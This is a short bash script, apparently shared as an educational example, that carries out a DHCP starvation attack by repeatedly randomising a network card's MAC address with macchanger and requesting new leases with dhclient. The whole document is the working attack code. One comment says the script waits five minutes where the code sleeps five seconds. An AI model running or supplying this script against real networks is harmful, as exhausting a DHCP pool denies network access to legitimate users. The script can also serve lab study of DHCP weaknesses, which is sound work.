#!/bin/bash
##this script shortly performs DHCP Starvation attack.!!
##only for educational purposes

for i in `seq 1 10`;do #execute following commands 10 times, seq 1 10 outputs 1,2,3,..10
 sudo macchanger -r eth0 && sudo dhclient  #change mac address and request ip address
sleep 5  #wait for 5 minutes
ip=`ifconfig | grep inet | head -1| cut -d " " -f10` #filter the ip address from ifconfig output
echo " New ip address is $ip "  #inform about new ip address
 done 
